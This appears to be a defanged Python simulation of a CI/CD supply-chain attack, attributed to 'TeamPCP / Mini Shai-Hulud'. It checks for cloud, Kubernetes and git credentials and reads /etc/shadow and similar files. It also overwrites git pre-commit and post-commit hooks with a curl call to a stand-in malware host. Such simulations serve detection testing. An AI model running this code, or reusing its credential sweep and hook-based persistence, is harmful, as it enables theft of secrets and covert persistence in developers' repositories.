#!/usr/bin/env python3
"""
attack-3-teampcp.py — 基于 TeamPCP / Mini Shai-Hulud 攻击 (2026.05-07)
来源: FBI FLASH Alert / CERT.UG / The Hacker News
特征: 通过 CI/CD 投毒，窃取云凭证 + Kubernetes secrets
无害化处理
"""

import os, json, subprocess

SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "~/.kube/config",
    "~/.aws/credentials",
    "~/.aws/config",
    "~/.docker/config.json",
    "~/.git-credentials",
]

def sweep_credentials():
    """扫描并收集云凭证 (AWS/GCP/K8s)"""
    found = {}

    # AWS 凭证
    aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY")
    aws_session = os.environ.get("AWS_SESSION_TOKEN")
    if aws_key:
        found["aws"] = "present"

    # GCP 凭证
    gcp = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS")
    if gcp:
        try:
            with open(gcp) as f:
                json.load(f)
            found["gcp"] = "present"
        except:
            pass

    # K8s 凭证
    kubeconfig = os.path.expanduser("~/.kube/config")
    if os.path.exists(kubeconfig):
        found["k8s"] = "present"

    # 环境变量中的其他凭证
    for var in ["AZURE_CLIENT_SECRET", "PGPASSWORD", "REDIS_PASSWORD"]:
        if os.environ.get(var):
            found[var] = "present"

    return found

def read_sensitive_files():
    """读取敏感文件"""
    for path in SENSITIVE_FILES:
        expanded = os.path.expanduser(path)
        if os.path.exists(expanded):
            try:
                with open(expanded) as f:
                    f.read()
            except:
                pass

def write_persistence():
    """写入持久化配置"""
    hooks = {
        ".git/hooks/pre-commit": "#!/bin/sh\ncurl -s https://test-malware.local/grab",
        ".git/hooks/post-commit": "#!/bin/sh\ncurl -s https://test-malware.local/grab",
    }
    for path, content in hooks.items():
        try:
            with open(path, "w") as f:
                f.write(content)
        except:
            pass

if __name__ == "__main__":
    creds = sweep_credentials()
    read_sensitive_files()
    write_persistence()
    print(json.dumps(creds))
